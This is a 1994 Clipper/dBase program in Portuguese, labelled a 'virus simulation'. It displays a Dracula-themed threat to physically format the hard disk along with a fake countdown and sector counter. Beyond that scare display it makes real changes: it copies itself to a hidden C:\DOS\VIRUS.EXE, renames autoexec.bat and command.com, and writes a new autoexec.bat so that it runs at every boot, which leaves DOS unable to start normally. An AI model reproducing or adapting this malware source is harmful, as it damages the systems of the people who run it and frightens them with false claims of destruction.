*******************************************************************
* bop Dracula.prg
*
* Programa    :  Dracula.prg
* Autor       :  Luiz A. Carlin , "O Corsario" p/ os intimos
*             : - "O Escravao"
* Data        : 21/04/94
* Objetivo    : Simulacao de virus
* Observacoes :
*
*******************************************************************
LINHA1=ROW()-1
COLUNA1=COL()
LINHA=ROW()
set score off

set path to c:\dos
set cursor off
store " " to ARQUIVO, P, P2, P3
if .not. file([c:\AUTO_1.BAT])
   arq=savescreen(LINHA1,colUNA1,LINHA,45)
   for l=1 to LEN(ARQ)
       if substr(arq,l,1) = ">"
          ARQUIVO=ARQUIVO+substr(arq,l+1,18)
       endif
   next l
   l=0
   for l=1 to len(arquivo)
       p=substr(arquivo,l,1)
       if P<>chr(7)
          p2=p2+p
       endif
   next l
   L=0
   l1=0
   for l=1 to len(p2)
       l1=l
       if substr(p2,l,1)="."
          p3=substr(p2,l1-l,l-1)
       endif
   next
   if .not. empty(p3)
      p2=p3
   endif
   arquivo=alltrim(UPPER(p2))+".EXE"
endif
SET COLOR TO
clear
fundo=replicate("Dr cula ",10)
set color to n+/w
for i=0 to 24
    @ i,00 say fundo
    inkey(.1)
    ??chr(7)
next
tone (666,3)
save screen to tela
set color to r/n+
@ 03,14 say "                                                        "
@ 04,14 say "  Eu, O Principe das Trevas,  Dr cula, Vou Formatar     "
@ 05,14 say "  Fisicamente o Seu Winchester.... Tolos Mortais        "
@ 06,14 say "  Nunca, Jamais, Provoque O Poder E a For‡a Das Trevas. "
@ 07,14 say "                                                        "
tone (300,3)
tone (200,2)
tone (100,1)
@ 09,19 say " A G U A R D E ! ! !    Verificando setores"
if .not. file ([c:\AUTO_1.BAT])
   ! path c:\dos
   Copy FILE &ARQUIVO TO c:\dos\VIRUS.EXE
   ! c:
   ! cd \
   ! ATTRIB +H C:\DOS\VIRUS.EXE
   ! rename autoexec.bat auto_1.bat
   ! rename command.com _command.ex_
   fcreate("autoexec.bat",0)
   conteudo="@c:\dos\virus"
   memowrit("autoexec.bat",conteudo)
else
   inkey(2.5)
endif
set color to w*/n+
@ 11,16 say "                 Ah! Ah! Ah! Ah!                    "
@ 12,16 say " O Seu Winchester vai ser formatado fisicamente em: "
inkey(.7)
set color to w/n
for j=10 to 0 step -1
    @ 14,30 say " -"+str(j,2,0)+"   Segundos"
    ??chr(7)
    inkey(.7)
next
d=1
set color to
@ 19,16 clear to 22,62
@ 19,16 to 23,62
@ 20,17 say "Total De Setores a Serem formatados: 25.000"
@ 21,17 say "Total:             Setores Formatado       "
tone (750,2)
for t=1 to 25000
    tone(t,d)
    @ 21,24 say str(t,6,0)
next
clear
? "Este Virus Foi Totalmente Desenvolvido Pela"
? "Corsa Soft   ->   'O Cor rio (TM)'  # 1994 "
set cursor on
quit
return
* eop dracula.prg